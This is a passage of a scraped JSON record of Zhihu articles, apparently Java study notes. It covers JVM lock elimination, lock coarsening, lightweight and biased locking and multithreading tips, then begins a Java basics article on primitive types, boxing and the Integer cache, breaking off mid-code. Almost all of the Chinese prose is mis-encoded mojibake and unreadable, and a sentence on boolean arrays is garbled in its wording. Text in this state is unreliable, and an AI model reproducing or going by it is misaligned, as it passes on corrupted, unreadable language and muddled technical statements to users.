ä¸­å¼•å…¥äº†è‡ªé€‚åº”çš„è‡ªæ—‹é”ã€‚è‡ªé€‚åº”æ„å‘³ç€è‡ªæ—‹çš„æ¬¡æ•°ä¸å†å›ºå®šäº†ï¼Œè€Œæ˜¯ç”±å‰ä¸€æ¬¡åœ¨åŒä¸€ä¸ªé”ä¸Šçš„è‡ªæ—‹æ¬¡æ•°åŠé”çš„æ‹¥æœ‰è€…çš„çŠ¶æ€æ¥å†³å®šã€‚</p><h2>é”æ¶ˆé™¤</h2><p>é”æ¶ˆé™¤æ˜¯æŒ‡å¯¹äºè¢«æ£€æµ‹å‡ºä¸å¯èƒ½å­˜åœ¨ç«äº‰çš„å…±äº«æ•°æ®çš„é”è¿›è¡Œæ¶ˆé™¤ã€‚</p><p>é”æ¶ˆé™¤ä¸»è¦æ˜¯é€šè¿‡é€ƒé€¸åˆ†ææ¥æ”¯æŒï¼Œå¦‚æœå †ä¸Šçš„å…±äº«æ•°æ®ä¸å¯èƒ½é€ƒé€¸å‡ºå»è¢«å…¶å®ƒçº¿ç¨‹è®¿é—®åˆ°ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠå®ƒä»¬å½“æˆç§æœ‰æ•°æ®å¯¹å¾…ï¼Œä¹Ÿå°±å¯ä»¥å°†å®ƒä»¬çš„é”è¿›è¡Œæ¶ˆé™¤ã€‚</p><p>å¯¹äºä¸€äº›çœ‹èµ·æ¥æ²¡æœ‰åŠ é”çš„ä»£ç ï¼Œå…¶å®éšå¼çš„åŠ äº†å¾ˆå¤šé”ã€‚ä¾‹å¦‚ä¸‹é¢çš„å­—ç¬¦ä¸²æ‹¼æ¥ä»£ç å°±éšå¼åŠ äº†é”ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"n\">String</span> <span class=\"nf\">concatString</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">s1</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">s2</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">s3</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">s1</span> <span class=\"o\">+</span> <span class=\"n\">s2</span> <span class=\"o\">+</span> <span class=\"n\">s3</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>String æ˜¯ä¸€ä¸ªä¸å¯å˜çš„ç±»ï¼Œç¼–è¯‘å™¨ä¼šå¯¹ String çš„æ‹¼æ¥è‡ªåŠ¨ä¼˜åŒ–ã€‚åœ¨ JDK 1.5 ä¹‹å‰ï¼Œä¼šè½¬åŒ–ä¸º StringBuffer å¯¹è±¡çš„è¿ç»­ append() æ“ä½œï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"n\">String</span> <span class=\"nf\">concatString</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">s1</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">s2</span><span class=\"o\">,</span> <span class=\"n\">String</span> <span class=\"n\">s3</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">StringBuffer</span> <span class=\"n\">sb</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">StringBuffer</span><span class=\"o\">();</span>\n    <span class=\"n\">sb</span><span class=\"o\">.</span><span class=\"na\">append</span><span class=\"o\">(</span><span class=\"n\">s1</span><span class=\"o\">);</span>\n    <span class=\"n\">sb</span><span class=\"o\">.</span><span class=\"na\">append</span><span class=\"o\">(</span><span class=\"n\">s2</span><span class=\"o\">);</span>\n    <span class=\"n\">sb</span><span class=\"o\">.</span><span class=\"na\">append</span><span class=\"o\">(</span><span class=\"n\">s3</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">sb</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><p>æ¯ä¸ª append() æ–¹æ³•ä¸­éƒ½æœ‰ä¸€ä¸ªåŒæ­¥å—ã€‚è™šæ‹Ÿæœºè§‚å¯Ÿå˜é‡ sbï¼Œå¾ˆå¿«å°±ä¼šå‘ç°å®ƒçš„åŠ¨æ€ä½œç”¨åŸŸè¢«é™åˆ¶åœ¨ concatString() æ–¹æ³•å†…éƒ¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œsb çš„æ‰€æœ‰å¼•ç”¨æ°¸è¿œä¸ä¼šé€ƒé€¸åˆ° concatString() æ–¹æ³•ä¹‹å¤–ï¼Œå…¶ä»–çº¿ç¨‹æ— æ³•è®¿é—®åˆ°å®ƒï¼Œå› æ­¤å¯ä»¥è¿›è¡Œæ¶ˆé™¤ã€‚</p><h2>é”ç²—åŒ–</h2><p>å¦‚æœä¸€ç³»åˆ—çš„è¿ç»­æ“ä½œéƒ½å¯¹åŒä¸€ä¸ªå¯¹è±¡åå¤åŠ é”å’Œè§£é”ï¼Œé¢‘ç¹çš„åŠ é”æ“ä½œå°±ä¼šå¯¼è‡´æ€§èƒ½æŸè€—ã€‚</p><p>ä¸Šä¸€èŠ‚çš„ç¤ºä¾‹ä»£ç ä¸­è¿ç»­çš„ append() æ–¹æ³•å°±å±äºè¿™ç±»æƒ…å†µã€‚å¦‚æœè™šæ‹Ÿæœºæ¢æµ‹åˆ°ç”±è¿™æ ·çš„ä¸€ä¸²é›¶ç¢çš„æ“ä½œéƒ½å¯¹åŒä¸€ä¸ªå¯¹è±¡åŠ é”ï¼Œå°†ä¼šæŠŠåŠ é”çš„èŒƒå›´æ‰©å±•ï¼ˆç²—åŒ–ï¼‰åˆ°æ•´ä¸ªæ“ä½œåºåˆ—çš„å¤–éƒ¨ã€‚å¯¹äºä¸Šä¸€èŠ‚çš„ç¤ºä¾‹ä»£ç å°±æ˜¯æ‰©å±•åˆ°ç¬¬ä¸€ä¸ª append() æ“ä½œä¹‹å‰ç›´è‡³æœ€åä¸€ä¸ª append() æ“ä½œä¹‹åï¼Œè¿™æ ·åªéœ€è¦åŠ é”ä¸€æ¬¡å°±å¯ä»¥äº†ã€‚</p><h2>è½»é‡çº§é”</h2><p>JDK 1.6 å¼•å…¥äº†åå‘é”å’Œè½»é‡çº§é”ï¼Œä»è€Œè®©é”æ‹¥æœ‰äº†å››ä¸ªçŠ¶æ€ï¼šæ— é”çŠ¶æ€ï¼ˆunlockedï¼‰ã€åå‘é”çŠ¶æ€ï¼ˆbiasbleï¼‰ã€è½»é‡çº§é”çŠ¶æ€ï¼ˆlightweight lockedï¼‰å’Œé‡é‡çº§é”çŠ¶æ€ï¼ˆinflatedï¼‰ã€‚</p><p>ä»¥ä¸‹æ˜¯ HotSpot è™šæ‹Ÿæœºå¯¹è±¡å¤´çš„å†…å­˜å¸ƒå±€ï¼Œè¿™äº›æ•°æ®è¢«ç§°ä¸º Mark Wordã€‚å…¶ä¸­ tag bits å¯¹åº”äº†äº”ä¸ªçŠ¶æ€ï¼Œè¿™äº›çŠ¶æ€åœ¨å³ä¾§çš„ state è¡¨æ ¼ä¸­ç»™å‡ºã€‚é™¤äº† marked for gc çŠ¶æ€ï¼Œå…¶å®ƒå››ä¸ªçŠ¶æ€å·²ç»åœ¨å‰é¢ä»‹ç»è¿‡äº†ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-93835fd4b371c071999bb4132ef73217_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"771\" data-rawheight=\"215\" class=\"origin_image zh-lightbox-thumb\" width=\"771\" data-original=\"https://pic4.zhimg.com/v2-93835fd4b371c071999bb4132ef73217_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;771&#39; height=&#39;215&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"771\" data-rawheight=\"215\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"771\" data-original=\"https://pic4.zhimg.com/v2-93835fd4b371c071999bb4132ef73217_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-93835fd4b371c071999bb4132ef73217_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ä¸‹å›¾å·¦ä¾§æ˜¯ä¸€ä¸ªçº¿ç¨‹çš„è™šæ‹Ÿæœºæ ˆï¼Œå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ç§°ä¸º Lock Record çš„åŒºåŸŸï¼Œè¿™æ˜¯åœ¨è½»é‡çº§é”è¿è¡Œè¿‡ç¨‹åˆ›å»ºçš„ï¼Œç”¨äºå­˜æ”¾é”å¯¹è±¡çš„ Mark Wordã€‚è€Œå³ä¾§å°±æ˜¯ä¸€ä¸ªé”å¯¹è±¡ï¼ŒåŒ…å«äº† Mark Word å’Œå…¶å®ƒä¿¡æ¯ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-bd05819104acb1595aa45a068dcb7fb1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"790\" data-rawheight=\"410\" class=\"origin_image zh-lightbox-thumb\" width=\"790\" data-original=\"https://pic2.zhimg.com/v2-bd05819104acb1595aa45a068dcb7fb1_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;790&#39; height=&#39;410&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"790\" data-rawheight=\"410\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"790\" data-original=\"https://pic2.zhimg.com/v2-bd05819104acb1595aa45a068dcb7fb1_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-bd05819104acb1595aa45a068dcb7fb1_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>è½»é‡çº§é”æ˜¯ç›¸å¯¹äºä¼ ç»Ÿçš„é‡é‡çº§é”è€Œè¨€ï¼Œå®ƒä½¿ç”¨ CAS æ“ä½œæ¥é¿å…é‡é‡çº§é”ä½¿ç”¨äº’æ–¥é‡çš„å¼€é”€ã€‚å¯¹äºç»å¤§éƒ¨åˆ†çš„é”ï¼Œåœ¨æ•´ä¸ªåŒæ­¥å‘¨æœŸå†…éƒ½æ˜¯ä¸å­˜åœ¨ç«äº‰çš„ï¼Œå› æ­¤ä¹Ÿå°±ä¸éœ€è¦éƒ½ä½¿ç”¨äº’æ–¥é‡è¿›è¡ŒåŒæ­¥ï¼Œå¯ä»¥å…ˆé‡‡ç”¨ CAS æ“ä½œè¿›è¡ŒåŒæ­¥ï¼Œå¦‚æœ CAS å¤±è´¥äº†å†æ”¹ç”¨äº’æ–¥é‡è¿›è¡ŒåŒæ­¥ã€‚</p><p>å½“å°è¯•è·å–ä¸€ä¸ªé”å¯¹è±¡æ—¶ï¼Œå¦‚æœé”å¯¹è±¡æ ‡è®°ä¸º 0 01ï¼Œè¯´æ˜é”å¯¹è±¡çš„é”æœªé”å®šï¼ˆunlockedï¼‰çŠ¶æ€ã€‚æ­¤æ—¶è™šæ‹Ÿæœºåœ¨å½“å‰çº¿ç¨‹çš„è™šæ‹Ÿæœºæ ˆä¸­åˆ›å»º Lock Recordï¼Œç„¶åä½¿ç”¨ CAS æ“ä½œå°†å¯¹è±¡çš„ Mark Word æ›´æ–°ä¸º Lock Record æŒ‡é’ˆã€‚å¦‚æœ CAS æ“ä½œæˆåŠŸäº†ï¼Œé‚£ä¹ˆçº¿ç¨‹å°±è·å–äº†è¯¥å¯¹è±¡ä¸Šçš„é”ï¼Œå¹¶ä¸”å¯¹è±¡çš„ Mark Word çš„é”æ ‡è®°å˜ä¸º 00ï¼Œè¡¨ç¤ºè¯¥å¯¹è±¡å¤„äºè½»é‡çº§é”çŠ¶æ€ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-f65556e3570d5d22ca9d0c55a7114e6f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"427\" class=\"origin_image zh-lightbox-thumb\" width=\"630\" data-original=\"https://pic4.zhimg.com/v2-f65556e3570d5d22ca9d0c55a7114e6f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;630&#39; height=&#39;427&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"427\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"630\" data-original=\"https://pic4.zhimg.com/v2-f65556e3570d5d22ca9d0c55a7114e6f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-f65556e3570d5d22ca9d0c55a7114e6f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å¦‚æœ CAS æ“ä½œå¤±è´¥äº†ï¼Œè™šæ‹Ÿæœºé¦–å…ˆä¼šæ£€æŸ¥å¯¹è±¡çš„ Mark Word æ˜¯å¦æŒ‡å‘å½“å‰çº¿ç¨‹çš„è™šæ‹Ÿæœºæ ˆï¼Œå¦‚æœæ˜¯çš„è¯è¯´æ˜å½“å‰çº¿ç¨‹å·²ç»æ‹¥æœ‰äº†è¿™ä¸ªé”å¯¹è±¡ï¼Œé‚£å°±å¯ä»¥ç›´æ¥è¿›å…¥åŒæ­¥å—ç»§ç»­æ‰§è¡Œï¼Œå¦åˆ™è¯´æ˜è¿™ä¸ªé”å¯¹è±¡å·²ç»è¢«å…¶ä»–çº¿ç¨‹çº¿ç¨‹æŠ¢å äº†ã€‚å¦‚æœæœ‰ä¸¤æ¡ä»¥ä¸Šçš„çº¿ç¨‹äº‰ç”¨åŒä¸€ä¸ªé”ï¼Œé‚£è½»é‡çº§é”å°±ä¸å†æœ‰æ•ˆï¼Œè¦è†¨èƒ€ä¸ºé‡é‡çº§é”ã€‚</p><h2>åå‘é”</h2><p>åå‘é”çš„æ€æƒ³æ˜¯åå‘äºè®©ç¬¬ä¸€ä¸ªè·å–é”å¯¹è±¡çš„çº¿ç¨‹ï¼Œè¿™ä¸ªçº¿ç¨‹åœ¨ä¹‹åè·å–è¯¥é”å°±ä¸å†éœ€è¦è¿›è¡ŒåŒæ­¥æ“ä½œï¼Œç”šè‡³è¿ CAS æ“ä½œä¹Ÿä¸å†éœ€è¦ã€‚</p><p>å½“é”å¯¹è±¡ç¬¬ä¸€æ¬¡è¢«çº¿ç¨‹è·å¾—çš„æ—¶å€™ï¼Œè¿›å…¥åå‘çŠ¶æ€ï¼Œæ ‡è®°ä¸º 1 01ã€‚åŒæ—¶ä½¿ç”¨ CAS æ“ä½œå°†çº¿ç¨‹ ID è®°å½•åˆ° Mark Word ä¸­ï¼Œå¦‚æœ CAS æ“ä½œæˆåŠŸï¼Œè¿™ä¸ªçº¿ç¨‹ä»¥åæ¯æ¬¡è¿›å…¥è¿™ä¸ªé”ç›¸å…³çš„åŒæ­¥å—å°±ä¸éœ€è¦å†è¿›è¡Œä»»ä½•åŒæ­¥æ“ä½œã€‚</p><p>å½“æœ‰å¦å¤–ä¸€ä¸ªçº¿ç¨‹å»å°è¯•è·å–è¿™ä¸ªé”å¯¹è±¡æ—¶ï¼Œåå‘çŠ¶æ€å°±å®£å‘Šç»“æŸï¼Œæ­¤æ—¶æ’¤é”€åå‘ï¼ˆRevoke Biasï¼‰åæ¢å¤åˆ°æœªé”å®šçŠ¶æ€æˆ–è€…è½»é‡çº§é”çŠ¶æ€ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-dd7fa078bb836f8aef4b33898d69378d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1490\" data-rawheight=\"764\" class=\"origin_image zh-lightbox-thumb\" width=\"1490\" data-original=\"https://pic2.zhimg.com/v2-dd7fa078bb836f8aef4b33898d69378d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1490&#39; height=&#39;764&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1490\" data-rawheight=\"764\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1490\" data-original=\"https://pic2.zhimg.com/v2-dd7fa078bb836f8aef4b33898d69378d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-dd7fa078bb836f8aef4b33898d69378d_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>åä¸‰ã€å¤šçº¿ç¨‹å¼€å‘è‰¯å¥½çš„å®è·µ</h2><ul><li> ç»™çº¿ç¨‹èµ·ä¸ªæœ‰æ„ä¹‰çš„åå­—ï¼Œè¿™æ ·å¯ä»¥æ–¹ä¾¿æ‰¾ Bugã€‚<br/> </li><li> ç¼©å°åŒæ­¥èŒƒå›´ï¼Œä»è€Œå‡å°‘é”äº‰ç”¨ã€‚ä¾‹å¦‚å¯¹äº synchronizedï¼Œåº”è¯¥å°½é‡ä½¿ç”¨åŒæ­¥å—è€Œä¸æ˜¯åŒæ­¥æ–¹æ³•ã€‚<br/> </li><li> å¤šç”¨åŒæ­¥å·¥å…·å°‘ç”¨ wait() å’Œ notify()ã€‚é¦–å…ˆï¼ŒCountDownLatch, CyclicBarrier, Semaphore å’Œ Exchanger è¿™äº›åŒæ­¥ç±»ç®€åŒ–äº†ç¼–ç æ“ä½œï¼Œè€Œç”¨ wait() å’Œ notify() å¾ˆéš¾å®ç°å¤æ‚æ§åˆ¶æµï¼›å…¶æ¬¡ï¼Œè¿™äº›åŒæ­¥ç±»æ˜¯ç”±æœ€å¥½çš„ä¼ä¸šç¼–å†™å’Œç»´æŠ¤ï¼Œåœ¨åç»­çš„ JDK ä¸­è¿˜ä¼šä¸æ–­ä¼˜åŒ–å’Œå®Œå–„ã€‚<br/> </li><li> ä½¿ç”¨ BlockingQueue å®ç°ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ã€‚<br/> </li><li> å¤šç”¨å¹¶å‘é›†åˆå°‘ç”¨åŒæ­¥é›†åˆï¼Œä¾‹å¦‚åº”è¯¥ä½¿ç”¨ ConcurrentHashMap è€Œä¸æ˜¯ Hashtableã€‚<br/> </li><li> ä½¿ç”¨æœ¬åœ°å˜é‡å’Œä¸å¯å˜ç±»æ¥ä¿è¯çº¿ç¨‹å®‰å…¨ã€‚<br/> </li><li> ä½¿ç”¨çº¿ç¨‹æ± è€Œä¸æ˜¯ç›´æ¥åˆ›å»ºçº¿ç¨‹ï¼Œè¿™æ˜¯å› ä¸ºåˆ›å»ºçº¿ç¨‹ä»£ä»·å¾ˆé«˜ï¼Œçº¿ç¨‹æ± å¯ä»¥æœ‰æ•ˆåœ°åˆ©ç”¨æœ‰é™çš„çº¿ç¨‹æ¥å¯åŠ¨ä»»åŠ¡ã€‚<br/> </li></ul><h2>å‚è€ƒèµ„æ–™</h2><ul><li>BruceEckel. Java ç¼–ç¨‹æ€æƒ³: ç¬¬ 4 ç‰ˆ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2007.</li><li>å‘¨å¿—æ˜. æ·±å…¥ç†è§£ Java è™šæ‹Ÿæœº [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2011.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/specs/jvms/se6/html/Threads.doc.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Threads and Locks</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//ifeve.com/thread-signaling/%23missed_signal\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">çº¿ç¨‹é€šä¿¡</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.importnew.com/12773.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java çº¿ç¨‹é¢è¯•é¢˜ Top 50</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//tutorials.jenkov.com/java-util-concurrent/blockingqueue.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">BlockingQueue</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/11265289/thread-state-java\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">thread state java</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//wiki.expertiza.ncsu.edu/index.php/CSC_456_Spring_2012/ch7_MN\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">CSC 456 Spring 2012/ch7 MN</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.logicbig.com/tutorials/core-java-tutorial/java-multi-threading/happens-before.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java - Understanding Happens-before relationship</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.slideshare.net/novathinker/6-thread-synchronization\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">6ì¥ Thread Synchronization</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/1202444/how-is-javas-threadlocal-implemented-under-the-hood/15653015\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">How is Java&#39;s ThreadLocal implemented under the hood?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//sites.google.com/site/webdevelopart/21-compile/06-java/javase/concurrent%3Ftmpl%3D%252Fsystem%252Fapp%252Ftemplates%252Fprint%252F%26showPrintDialog%3D1\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Concurrent</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.javacreed.com/java-fork-join-example/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">JAVA FORK JOIN EXAMPLE</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//ifeve.com/talk-concurrency-forkjoin/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">èŠèŠå¹¶å‘ï¼ˆå…«ï¼‰â€”â€”Fork/Join æ¡†æ¶ä»‹ç»</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.oracle.com/technetwork/java/javase/tech/biasedlocking-oopsla2006-preso-150106.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;899&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"899\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"899\" data-original=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4d7b61186191042d91d230ccb26a7d99_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "Java", 
                    "tagLink": "https://api.zhihu.com/topics/19561132"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/59850281", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 5, 
            "title": "Java åŸºç¡€", 
            "content": "<p></p><h2>ä¸€ã€æ•°æ®ç±»å‹</h2><h2>åŸºæœ¬ç±»å‹</h2><ul><li>byte/8</li><li>char/16</li><li>short/16</li><li>int/32</li><li>float/32</li><li>long/64</li><li>double/64</li><li>boolean/\\~</li></ul><p>boolean åªæœ‰ä¸¤ä¸ªå€¼ï¼štrueã€falseï¼Œå¯ä»¥ä½¿ç”¨ 1 bit æ¥å­˜å‚¨ï¼Œä½†æ˜¯å…·ä½“å¤§å°æ²¡æœ‰æ˜ç¡®è§„å®šã€‚JVM ä¼šåœ¨ç¼–è¯‘æ—¶æœŸå°† boolean ç±»å‹çš„æ•°æ®è½¬æ¢ä¸º intï¼Œä½¿ç”¨ 1 æ¥è¡¨ç¤º trueï¼Œ0 è¡¨ç¤º falseã€‚JVM å¹¶ä¸ç›´æ¥æ”¯æŒ boolean æ•°ç»„ï¼Œè€Œæ˜¯ä½¿ç”¨ byte æ•°ç»„æ¥è¡¨ç¤º int æ•°ç»„æ¥è¡¨ç¤ºã€‚</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Primitive Data Types</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/specs/jvms/se8/jvms8.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">The JavaÂ® Virtual Machine Specification</a></li></ul><h2>åŒ…è£…ç±»å‹</h2><p>åŸºæœ¬ç±»å‹éƒ½æœ‰å¯¹åº”çš„åŒ…è£…ç±»å‹ï¼ŒåŸºæœ¬ç±»å‹ä¸å…¶å¯¹åº”çš„åŒ…è£…ç±»å‹ä¹‹é—´çš„èµ‹å€¼ä½¿ç”¨è‡ªåŠ¨è£…ç®±ä¸æ‹†ç®±å®Œæˆã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span>     <span class=\"c1\">// è£…ç®±\n</span><span class=\"c1\"></span><span class=\"kt\">int</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>         <span class=\"o\">//</span> <span class=\"n\">æ‹†ç®±</span></code></pre></div><h2>ç¼“å­˜æ± </h2><p>new Integer(123) ä¸ Integer.valueOf(123) çš„åŒºåˆ«åœ¨äºï¼š</p><ul><li>new Integer(123) æ¯æ¬¡éƒ½ä¼šæ–°å»ºä¸€ä¸ªå¯¹è±¡ï¼›</li><li>Integer.valueOf(123) ä¼šä½¿ç”¨ç¼“å­˜æ± ä¸­çš„å¯¹è±¡ï¼Œå¤šæ¬¡è°ƒç”¨ä¼šå–å¾—åŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">Integer</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">x</span> <span class=\"o\">==</span> <span class=\"n\">y</span><span class=\"o\">);</span>    <span class=\"c1\">// false\n</span><span class=\"c1\"></span><span class=\"n\">Integer</span> <span class=\"n\">z</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">Integer</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">z</span> <span class=\"o\">==</span> <span class=\"n\">k</span><span class=\"o\">);</span>   <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>valueOf() æ–¹æ³•çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å…ˆåˆ¤æ–­å€¼æ˜¯å¦åœ¨ç¼“å­˜æ± ä¸­ï¼Œå¦‚æœåœ¨çš„è¯å°±ç›´æ¥è¿”å›ç¼“å­˜æ± çš„å†…å®¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"n\">Integer</span> <span class=\"nf\">valueOf</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&gt;=</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">low</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">high</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">IntegerCache</span><span class=\"o\">.</span><span class=\"na\">cache</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"o\">(-</span><span 